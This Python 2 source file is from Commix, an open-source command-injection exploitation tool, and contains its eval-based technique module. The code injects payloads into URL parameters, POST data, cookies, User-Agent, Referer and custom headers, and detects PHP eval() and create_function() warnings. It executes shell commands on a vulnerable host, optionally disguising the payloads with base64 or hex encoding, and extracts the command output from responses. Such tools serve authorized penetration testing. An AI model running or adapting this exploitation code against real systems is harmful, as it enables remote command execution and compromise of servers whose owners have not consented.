#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import json
import string
import random
import urllib
import urllib2
import urlparse

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters

from src.core.injections.controller import checks
from src.core.injections.results_based.techniques.eval_based import eb_payloads

"""
The dynamic code evaluation (aka eval-based) technique.
"""

"""
Check if target host is vulnerable.
"""
def injection_test(payload, http_request_method, url):

  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    #url = parameters.do_GET_check(url)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    # Get the response of the request
    response = requests.get_request_response(request)

  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    parameter = parameter.replace("+","%2B")

    # Define the POST data   
    if settings.IS_JSON == False:
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      request = urllib2.Request(url, data)
    else:
      payload = payload.replace("\"", "\\\"")
      data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
      try:
        data = json.loads(data, strict = False)
      except:
        pass
      request = urllib2.Request(url, json.dumps(data))
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
  
    # Get the response of the request
    response = requests.get_request_response(request)

  return response, vuln_parameter

"""
Detection for classic 'warning' messages.
"""
def warning_detection(url, http_request_method):
  try:
    # Find the host part
    url_part = url.split("=")[0]
    request = urllib2.Request(url_part)
    # Check if defined extra headers.
    headers.do_check(request)
    response = requests.get_request_response(request)
    if response:
      response = urllib2.urlopen(request)
      html_data = response.read()
      err_msg = ""
      if "eval()'d code" in html_data:
        err_msg = "'eval()'"
      if "Warning: create_function():" in html_data:
        err_msg = "create_function()"
      if "Cannot execute a blank command in" in html_data:
        err_msg = "execution of a blank command,"
      if "sh: command substitution:" in html_data:
        err_msg = "command substitution"
      if "Warning: usort()" in html_data:
        err_msg = "'usort()'"
      if re.findall(r"=/(.*)/&", url):
        if "Warning: preg_replace():" in html_data:
          err_msg = "'preg_replace()'"
        url = url.replace("/&","/e&")
      if "Warning: assert():" in html_data:
        err_msg = "'assert()'"
      if "Failure evaluating code:" in html_data:
        err_msg = "code evaluation"
      if err_msg != "":
        warn_msg = "A failure message on " + err_msg + " was detected on page's response."
        print settings.print_warning_msg(warn_msg)
    return url
  except urllib2.HTTPError, err_msg:
    print settings.print_critical_msg(err_msg)
    raise SystemExit()

"""
Evaluate test results.
"""
def injection_test_results(response, TAG, randvcalc):
  if response == False:
    return False
  else:
    html_data = response.read()
    html_data = re.sub("\n", " ", html_data)
    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + " " + TAG + " " + TAG + " " , html_data)
    else:
      shell = re.findall(r"" + TAG + " " + str(randvcalc) + " " + TAG + " " + TAG + " " , html_data)
    return shell

"""
Check if target host is vulnerable. (Cookie-based injection)
"""
def cookie_injection_test(url, vuln_parameter, payload):
  return requests.cookie_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (User-Agent-based injection)
"""
def user_agent_injection_test(url, vuln_parameter, payload):
  return requests.user_agent_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Referer-based injection)
"""
def referer_injection_test(url, vuln_parameter, payload):
  return requests.referer_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Custom header injection)
"""
def custom_header_injection_test(url, vuln_parameter, payload):
  return requests.custom_header_injection(url, vuln_parameter, payload)

"""
The main command injection exploitation.
"""
def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
  
  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
    # Execute shell commands on vulnerable host.
    if alter_shell:
      payload = eb_payloads.cmd_execution_alter_shell(separator, TAG, cmd)
    else:
      payload = eb_payloads.cmd_execution(separator, TAG, cmd)

    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)
    # Fixation for specific payload.
    if ")%3B" + urllib.quote(")}") in payload:
      payload = payload.replace(")%3B" + urllib.quote(")}"), ")" + urllib.quote(")}"))

    # Whitespace fixation
    payload = re.sub(" ", whitespace, payload)

    # Encode payload to base64 format.
    if settings.TAMPER_SCRIPTS['base64encode']:
      from src.core.tamper import base64encode
      payload = base64encode.encode(payload)

    # Encode payload to hex format.
    elif settings.TAMPER_SCRIPTS['hexencode']:
      from src.core.tamper import hexencode
      payload = hexencode.encode(payload)

    # Check if defined "--verbose" option.
    if settings.VERBOSITY_LEVEL >= 1:
      info_msg = "Executing the '" + cmd + "' command... "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      sys.stdout.write("\n" + settings.print_payload(payload) + "\n")

    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      response = cookie_injection_test(url, vuln_parameter, payload)

     # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      response = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      response = referer_injection_test(url, vuln_parameter, payload)

    # Check if defined custom header with "INJECT_HERE" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      response = custom_header_injection_test(url, vuln_parameter, payload)

    else:
      # Check if defined method is GET (Default).
      if http_request_method == "GET":
        # Check if its not specified the 'INJECT_HERE' tag
        #url = parameters.do_GET_check(url)
        
        target = re.sub(settings.INJECT_TAG, payload, url)
        vuln_parameter = ''.join(vuln_parameter)
        request = urllib2.Request(target)
        
        # Check if defined extra headers.
        headers.do_check(request)  

        # Get the response of the request
        response = requests.get_request_response(request)
       
      else :
        # Check if defined method is POST.
        parameter = menu.options.data
        parameter = urllib2.unquote(parameter)
        
        # Check if its not specified the 'INJECT_HERE' tag
        parameter = parameters.do_POST_check(parameter)
        parameter = parameter.replace("+","%2B")
        
        # Define the POST data   
        if settings.IS_JSON == False:
          data = re.sub(settings.INJECT_TAG, payload, parameter)
          request = urllib2.Request(url, data)
        else:
          payload = payload.replace("\"", "\\\"")
          data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
          data = json.loads(data, strict = False)
          request = urllib2.Request(url, json.dumps(data))
        
        # Check if defined extra headers.
        headers.do_check(request)

        # Get the response of the request
        response = requests.get_request_response(request)

    return response

  # Do the injection check
  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
  tries = 0
  while not response:
    if tries < (menu.options.failed_tries / 2):
      response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
      tries = tries + 1
    else:
      err_msg = "Something went wrong, the request has failed (" + str(tries) + ") times continuously."
      sys.stdout.write(settings.print_critical_msg(err_msg)+"\n")
      sys.exit(0)

  return response



"""
Command execution results.
"""
def injection_results(response, TAG, cmd):
  
  new_line = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
  # Grab execution results
  html_data = response.read()
  html_data = re.sub("\n", new_line, html_data)
  shell = re.findall(r"" + TAG + new_line + TAG + "(.*)" + TAG + new_line + TAG + "", html_data)
  shell = shell[0].replace(new_line, "\n").rstrip().lstrip()
  return shell

#eof